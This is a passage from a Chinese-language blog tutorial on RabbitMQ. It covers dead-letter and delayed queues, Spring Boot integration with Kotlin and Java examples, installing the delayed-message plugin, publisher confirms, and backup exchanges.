<li>消息被拒，并且不放回队列中<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-01-46-14.png"><br>生产者代码：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//死信时间设置</span></span><br><span class="line">    <span class="keyword">val</span> properties = AMQP.BasicProperties</span><br><span class="line">        .Builder()</span><br><span class="line">        .expiration(<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">        .build()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0.</span><span class="number">.10</span>) &#123;</span><br><span class="line">        <span class="keyword">val</span> message = <span class="string">&quot;info-<span class="variable">$i</span>&quot;</span></span><br><span class="line">        channel.basicPublish(NORMAL_EXCHANGE, <span class="string">&quot;zhangsan&quot;</span>,properties ,message.toByteArray())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
消费者1代码：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明交换机</span></span><br><span class="line">    channel.exchangeDeclare(NORMAL_EXCHANGE, <span class="string">&quot;direct&quot;</span>)</span><br><span class="line">    channel.exchangeDeclare(DEAD_EXCHANGE, <span class="string">&quot;direct&quot;</span>)</span><br><span class="line">    <span class="comment">//声明队列</span></span><br><span class="line">    <span class="keyword">val</span> arguments = HashMap&lt;String, Any&gt;()</span><br><span class="line">    <span class="comment">//过期时间设置</span></span><br><span class="line">    <span class="comment">//arguments[&quot;x-message-ttl&quot;] = 10000</span></span><br><span class="line">    <span class="comment">//可以通过生产者设置时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 设置队列最大长度，（超过长度的会变为死信内容）</span></span><br><span class="line">    arguments[<span class="string">&quot;x-max-length&quot;</span>] = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//正常队列，设置死信后交换机</span></span><br><span class="line">    arguments[<span class="string">&quot;x-dead-letter-exchange&quot;</span>] = DEAD_EXCHANGE</span><br><span class="line">    <span class="comment">//设置死信routingKey</span></span><br><span class="line">    arguments[<span class="string">&quot;x-dead-letter-routing-key&quot;</span>] = <span class="string">&quot;lisi&quot;</span></span><br><span class="line">    channel.queueDeclare(NORMAL_QUEUE, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, arguments)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//==============================================================================================//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    channel.queueDeclare(DEAD_QUEUE, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">    channel.queueBind(NORMAL_QUEUE, NORMAL_EXCHANGE, <span class="string">&quot;zhangsan&quot;</span>)</span><br><span class="line">    channel.queueBind(DEAD_QUEUE, DEAD_EXCHANGE, <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line"></span><br><span class="line">    channel.basicConsume(NORMAL_QUEUE, <span class="literal">true</span>, &#123; consumerTag, message -&gt;</span><br><span class="line">        println(String(message.body, charset(<span class="string">&quot;UTF-8&quot;</span>)))</span><br><span class="line"></span><br><span class="line">    &#125;, &#123; consumerTag -&gt; &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
消费者2代码：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line"></span><br><span class="line">    channel.basicConsume(DEAD_QUEUE, <span class="literal">true</span>, &#123; consumerTag, message -&gt;</span><br><span class="line">        println(String(message.body, charset(<span class="string">&quot;UTF-8&quot;</span>)))</span><br><span class="line"></span><br><span class="line">    &#125;, &#123; consumerTag -&gt; &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="延迟队列"><a href="#延迟队列" class="headerlink" title="延迟队列"></a>延迟队列</h3><p>就是死信队列中所谓的TTL（消息最大保存时间）<br>延迟队列就是需要指定时间被处理的队列<br>使用场景：如订单10分钟未支付则自动取消<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-07-36-25.png"></p>
<p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-00-37-11.png"></p>
<h4 id="springboot整合"><a href="#springboot整合" class="headerlink" title="springboot整合"></a>springboot整合</h4><ol>
<li><p>依赖包导入：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation(<span class="string">&quot;org.springframework.boot:spring-boot-starter-web&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;com.fasterxml.jackson.module:jackson-module-kotlin&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;org.jetbrains.kotlin:kotlin-reflect&quot;</span>)</span><br><span class="line">    implementation (<span class="string">&quot;javax.servlet:javax.servlet-api:4.0.1&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;org.springframework.boot:spring-boot-starter&quot;</span>)</span><br><span class="line"><span class="comment">//	rabbitMQ依赖</span></span><br><span class="line">    implementation(<span class="string">&quot;org.springframework.boot:spring-boot-starter-amqp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    implementation(<span class="string">&quot;com.squareup.moshi:moshi:1.13.0&quot;</span>)</span><br><span class="line">    <span class="comment">//注解</span></span><br><span class="line">    compileOnly(<span class="string">&quot;org.projectlombok:lombok&quot;</span>)</span><br><span class="line">    annotationProcessor(<span class="string">&quot;org.projectlombok:lombok&quot;</span>)</span><br><span class="line">    <span class="comment">//swagger</span></span><br><span class="line">    implementation(<span class="string">&quot;io.springfox:springfox-swagger2:3.0.0&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;io.springfox:springfox-swagger-ui:3.0.0&quot;</span>)</span><br><span class="line">    <span class="comment">//rabbitMQ测试依赖</span></span><br><span class="line">    testImplementation(<span class="string">&quot;org.springframework.boot:spring-boot-starter-test&quot;</span>)</span><br><span class="line">    testImplementation(<span class="string">&quot;org.springframework.amqp:spring-rabbit-test&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置项，配置交换机和队列以及他们的关系</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TtlQueueConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span>&#123;</span><br><span class="line">        <span class="comment">//普通交换机</span></span><br><span class="line">        <span class="keyword">val</span> X_EXCHANGE = <span class="string">&quot;X&quot;</span></span><br><span class="line">        <span class="comment">//死信交换机</span></span><br><span class="line">        <span class="keyword">val</span> Y_DEAD_LETTER_EXCHANGE = <span class="string">&quot;Y&quot;</span></span><br><span class="line">        <span class="comment">//普通队列</span></span><br><span class="line">        <span class="keyword">val</span> QUEUE_A = <span class="string">&quot;QA&quot;</span></span><br><span class="line">        <span class="keyword">val</span> QUEUE_B = <span class="string">&quot;QB&quot;</span></span><br><span class="line">        <span class="comment">//死信队列</span></span><br><span class="line">        <span class="keyword">val</span> QUEUE_DEAD_LETTER = <span class="string">&quot;QD&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明xExchange</span></span><br><span class="line">    <span class="meta">@Bean(<span class="string">&quot;xExchange&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">xExchange</span><span class="params">()</span></span>: DirectExchange &#123;</span><br><span class="line">        <span class="keyword">return</span> DirectExchange(X_EXCHANGE)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明yExchange</span></span><br><span class="line">    <span class="meta">@Bean(<span class="string">&quot;yExchange&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">yExchange</span><span class="params">()</span></span>: DirectExchange &#123;</span><br><span class="line">        <span class="keyword">return</span> DirectExchange(Y_DEAD_LETTER_EXCHANGE)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明普通队列TTL为10s</span></span><br><span class="line">    <span class="meta">@Bean(<span class="string">&quot;queueA&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueA</span><span class="params">()</span></span>: Queue &#123;</span><br><span class="line">        <span class="keyword">val</span> arguments = HashMap&lt;String, Any&gt;()</span><br><span class="line">        arguments[<span class="string">&quot;x-message-ttl&quot;</span>] = <span class="number">10000</span></span><br><span class="line">        arguments[<span class="string">&quot;x-dead-letter-exchange&quot;</span>] = Y_DEAD_LETTER_EXCHANGE</span><br><span class="line">        arguments[<span class="string">&quot;x-dead-letter-routing-key&quot;</span>] = <span class="string">&quot;YD&quot;</span></span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(QUEUE_A).withArguments(arguments).build()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明普通队列TTL为40s</span></span><br><span class="line">    <span class="meta">@Bean(<span class="string">&quot;queueB&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueB</span><span class="params">()</span></span>: Queue &#123;</span><br><span class="line">        <span class="keyword">val</span> arguments = HashMap&lt;String, Any&gt;()</span><br><span class="line">        arguments[<span class="string">&quot;x-message-ttl&quot;</span>] = <span class="number">40000</span></span><br><span class="line">        arguments[<span class="string">&quot;x-dead-letter-exchange&quot;</span>] = Y_DEAD_LETTER_EXCHANGE</span><br><span class="line">        arguments[<span class="string">&quot;x-dead-letter-routing-key&quot;</span>] = <span class="string">&quot;YD&quot;</span></span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(QUEUE_B).withArguments(arguments).build()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//死信队列</span></span><br><span class="line">    <span class="meta">@Bean(<span class="string">&quot;queueD&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueD</span><span class="params">()</span></span>: Queue &#123;</span><br><span class="line">        <span class="keyword">return</span> QueueBuilder.durable(QUEUE_DEAD_LETTER).build()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//绑定</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueABindingX</span><span class="params">(<span class="meta">@Qualifier(<span class="string">&quot;queueA&quot;</span>)</span> queueA: <span class="type">Queue</span>, <span class="meta">@Qualifier(<span class="string">&quot;xExchange&quot;</span>)</span> exchange: <span class="type">DirectExchange</span>)</span></span>: Binding &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(queueA).to(exchange).with(<span class="string">&quot;XA&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueBBindingX</span><span class="params">(<span class="meta">@Qualifier(<span class="string">&quot;queueB&quot;</span>)</span> queueB: <span class="type">Queue</span>, <span class="meta">@Qualifier(<span class="string">&quot;xExchange&quot;</span>)</span> exchange: <span class="type">DirectExchange</span>)</span></span>: Binding &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(queueB).to(exchange).with(<span class="string">&quot;XB&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">queueDBindingY</span><span class="params">(<span class="meta">@Qualifier(<span class="string">&quot;queueD&quot;</span>)</span> queueD: <span class="type">Queue</span>, <span class="meta">@Qualifier(<span class="string">&quot;yExchange&quot;</span>)</span> exchange: <span class="type">DirectExchange</span>)</span></span>: Binding &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(queueD).to(exchange).with(<span class="string">&quot;YD&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置生产者</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="string">&quot;/ttl&quot;</span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SendMsgController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(<span class="keyword">this</span>.javaClass)</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> rabbitTemplate: RabbitTemplate</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始发消息</span></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/send/&#123;message&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">sendMsg</span><span class="params">(<span class="meta">@PathVariable</span> message: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;当前时间：<span class="subst">$&#123;Date().toString()&#125;</span>,发送一条消息给两个TTL队列：<span class="variable">$message</span>&quot;</span>)</span><br><span class="line">        rabbitTemplate.convertAndSend(<span class="string">&quot;X&quot;</span>, <span class="string">&quot;XA&quot;</span>, <span class="string">&quot;消息消过期时间为10s：<span class="variable">$message</span>&quot;</span>)</span><br><span class="line">        rabbitTemplate.convertAndSend(<span class="string">&quot;X&quot;</span>, <span class="string">&quot;XB&quot;</span>, <span class="string">&quot;消息消过期时间为40s：<span class="variable">$message</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置消费者</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DeadLetterQueueConsumer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(<span class="keyword">this</span>.javaClass)</span><br><span class="line">    <span class="comment">//接受消息</span></span><br><span class="line">    <span class="meta">@RabbitListener(queues = [<span class="string">&quot;QD&quot;</span>])</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">reveiceD</span><span class="params">(message:<span class="type">Message</span>,channel:<span class="type">Channel</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> msg = String(message.body)</span><br><span class="line">        log.info(<span class="string">&quot;当前时间：<span class="subst">$&#123;Date().toString()&#125;</span>,收到死信队列的消息：<span class="variable">$msg</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过生产者设置过期时间</p>
</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发消息和延迟时间</span></span><br><span class="line">   <span class="meta">@GetMapping(<span class="string">&quot;/send/&#123;message&#125;/&#123;ttl&#125;&quot;</span>)</span></span><br><span class="line">   <span class="function"><span class="keyword">fun</span> <span class="title">sendMsg</span><span class="params">(<span class="meta">@PathVariable</span> message: <span class="type">String</span>, <span class="meta">@PathVariable</span> ttl: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">       log.info(<span class="string">&quot;当前时间：<span class="subst">$&#123;Date().toString()&#125;</span>,他的过期时间为：<span class="variable">$ttl</span> ms ,发送一条消息给两个TTL队列：<span class="variable">$message</span>&quot;</span>)</span><br><span class="line">       rabbitTemplate.convertAndSend(<span class="string">&quot;X&quot;</span>, <span class="string">&quot;XC&quot;</span>, <span class="string">&quot;消息过期时间为<span class="variable">$ttl</span> ms的消息：<span class="variable">$message</span>&quot;</span>) &#123; msg -&gt;</span><br><span class="line">           <span class="comment">//设置过期时间</span></span><br><span class="line">           msg.messageProperties.expiration = ttl.toString()</span><br><span class="line">           msg</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>出现问题（队列先进先出）<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-00-46-45.png"><br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-04-46-04.png"><br>这个是基于死信队列才会产生的问题。因此采用基于插件的方式去解决</li>
</ol>
<h3 id="基于插件解决延迟队列"><a href="#基于插件解决延迟队列" class="headerlink" title="基于插件解决延迟队列"></a>基于插件解决延迟队列</h3><blockquote>
<p>安装延时队列插件<br>可去<a href="https://www.rabbitmq.com/community-plugins.html">官网下载</a> rabbitmq_delayed_message_exchange 插件，放置到 RabbitMQ 的插件目录。</p>
</blockquote>
<p>进入 RabbitMQ 的安装目录下的 plgins 目录，执行下面命令让该插件生效，然后重启 RabbitMQ</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@VM-0-6-centos software]# <span class="built_in">ls</span></span><br><span class="line">erlang-21.3.8.21-1.el7.x86_64.rpm  rabbitmq_delayed_message_exchange-3.8.0.ez  rabbitmq-server-3.8.8-1.el7.noarch.rpm</span><br><span class="line"><span class="comment">#移动</span></span><br><span class="line"><span class="built_in">cp</span> rabbitmq_delayed_message_exchange-3.8.0.ez /usr/lib/rabbitmq/lib/rabbitmq_server-3.8.8/plugins</span><br><span class="line"><span class="comment">#安装</span></span><br><span class="line">rabbitmq-plugins <span class="built_in">enable</span> rabbitmq_delayed_message_exchange</span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart rabbitmq-server</span><br></pre></td></tr></table></figure>
<p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-20-14-40.png"><br>在这里新增了一个队列delayed.queue,一个自定义交换机 delayed.exchange，绑定关系如下:<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-09-50-09.png"></p>
<ol>
<li>配置文件类代码：</li>
</ol>
<p>在我们自定义的交换机中，这是一种新的交换类型，该类型消息支持延迟投递机制消息传递后并不会立即投递到目标队列中，而是存储在 mnesia(一个分布式数据系统)表中，当达到投递时间时，才投递到目标队列中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DelayedQueueConfig</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DELAYED_QUEUE_NAME</span> <span class="operator">=</span> <span class="string">&quot;delayed.queue&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DELAYED_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;delayed.exchange&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DELAYED_ROUTING_KEY</span> <span class="operator">=</span> <span class="string">&quot;delayed.routingkey&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">delayedQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(DELAYED_QUEUE_NAME);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//自定义交换机 我们在这里定义的是一个延迟交换机</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CustomExchange <span class="title function_">delayedExchange</span><span class="params">()</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; args = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//自定义交换机的类型</span></span><br><span class="line">        args.put(<span class="string">&quot;x-delayed-type&quot;</span>, <span class="string">&quot;direct&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CustomExchange</span>(DELAYED_EXCHANGE_NAME, <span class="string">&quot;x-delayed-message&quot;</span>, <span class="literal">true</span>, <span class="literal">false</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingDelayedQueue</span><span class="params">(<span class="meta">@Qualifier(&quot;delayedQueue&quot;)</span> Queue queue,</span></span><br><span class="line"><span class="params">                                       <span class="meta">@Qualifier(&quot;delayedExchange&quot;)</span> CustomExchange delayedExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(queue).to(delayedExchange).with(DELAYED_ROUTING_KEY).noargs();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>生产者代码<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;sendDelayMsg/&#123;message&#125;/&#123;delayTime&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">(<span class="meta">@PathVariable</span> String message, <span class="meta">@PathVariable</span> Integer delayTime)</span> &#123;</span><br><span class="line">    rabbitTemplate.convertAndSend(DELAYED_EXCHANGE_NAME, DELAYED_ROUTING_KEY, message,</span><br><span class="line">            correlationData -&gt; &#123;</span><br><span class="line">                correlationData.getMessageProperties().setDelay(delayTime);</span><br><span class="line">                <span class="keyword">return</span> correlationData;</span><br><span class="line">            &#125;);</span><br><span class="line">    log.info(<span class="string">&quot; 当 前 时 间 ： &#123;&#125;, 发 送 一 条 延 迟 &#123;&#125; 毫秒的信息给队列 delayed.queue:&#123;&#125;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(), delayTime, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>延时队列在需要延时处理的场景下非常有用，使用 RabbitMQ 来实现延时队列可以很好的利用 RabbitMQ 的特性，如：消息可靠发送、消息可靠投递、死信队列来保障消息至少被消费一次以及未被正确处理的消息不会被丢弃。另外，通过 RabbitMQ 集群的特性，可以很好的解决单点故障问题，不会因为 单个节点挂掉导致延时队列不可用或者消息丢失。</p>
<p>当然，延时队列还有很多其它选择，比如利用 Java 的 DelayQueue，利用 Redis 的 zset，利用 Quartz 或者利用 kafka 的时间轮，这些方式各有特点,看需要适用的场景</p>
<h3 id="发布确认-springboot集成"><a href="#发布确认-springboot集成" class="headerlink" title="发布确认-springboot集成"></a>发布确认-springboot集成</h3><p>在生产环境中，出现特殊情况导致rabbitMQ重启。如何去手动回复和处理。<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-23-45-29.png"></p>
<h4 id="发布确认，（交换机）"><a href="#发布确认，（交换机）" class="headerlink" title="发布确认，（交换机）"></a>发布确认，（交换机）</h4><ol>
<li><p>配置确认发布<br>在<code>application.yml</code>中配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">publisher-confirm-type:</span> <span class="string">correlated</span></span><br></pre></td></tr></table></figure>
<p>他有三个选项：1. NONE，默认，不开启发布确认。2. CORRELATED，发布消息成功后触发回调方法。3. SIMPLE，他的第一个效果和CORRELATED一样，第二个效果是如果他接受到<code>waitForConfirmsOrDie</code>的返回值为false时，会直接关闭channel信道。</p>
</li>
<li><p>生产者代码：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发消息</span></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/send/&#123;msg&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">send</span><span class="params">(<span class="meta">@PathVariable</span> msg: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        rabbitTemplate.convertAndSend(<span class="string">&quot;confirm_exchange&quot;</span>, <span class="string">&quot;key1&quot;</span>, msg, CorrelationData(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">        log.info(<span class="string">&quot;发送消息：<span class="variable">$msg</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>他需要配置回调接口</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCallBack</span> : <span class="type">RabbitTemplate.ConfirmCallback</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> rabbitTemplate: RabbitTemplate</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(javaClass)</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (::rabbitTemplate.isInitialized) &#123;</span><br><span class="line">            rabbitTemplate.setConfirmCallback(<span class="keyword">this</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;rabbitTemplate 没有初始化&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//交换机回调方法</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">confirm</span><span class="params">(correlationData: <span class="type">CorrelationData</span>?, ack: <span class="type">Boolean</span>, cause: <span class="type">String</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">val</span> id = correlationData?.id</span><br><span class="line">        <span class="keyword">if</span> (ack) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;交换机已经收到了ID为：<span class="variable">$id</span> 的消息&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;交换机没有收到ID为：<span class="variable">$id</span> 的消息,原因是：<span class="variable">$cause</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>消费者代码：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConfirmConsumer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(javaClass)</span><br><span class="line">    <span class="meta">@RabbitListener(queues = [<span class="string">&quot;confirm_queue&quot;</span>])</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">receive</span><span class="params">(msg: <span class="type">Message</span>)</span></span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;接收到的消息：&#123;&#125;&quot;</span>, String(msg.body))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="回退消息"><a href="#回退消息" class="headerlink" title="回退消息"></a>回退消息</h4><p>通过设置<code>mandatory</code>参数可以将消息传递过程中不可达目的的消息返还给生产者<br>配置项：<code>publisher-returns: true</code><br>然后再配置回退消息的回调函数，然后执行即可：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCallBack</span> : <span class="type">RabbitTemplate.ConfirmCallback</span>,<span class="type">RabbitTemplate.ReturnsCallback</span> &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">returnedMessage</span><span class="params">(returned: <span class="type">ReturnedMessage</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="备份交换机"><a href="#备份交换机" class="headerlink" title="备份交换机"></a>备份交换机</h3><p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-09-46-47.png"><br>优点：可以备份消息和报警<br>他的关键点是他的正常交换机参数需要设置一个<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-04-45-04.png"><br>当正常交换机出现问题时，他会进入备份交换机。（与死信交换机类似）。只是死信交换机是消息无法正确得到解决会进入死信交换机。<br>而消息如果无法正常进入交换机时，会进入备份交换机</p>
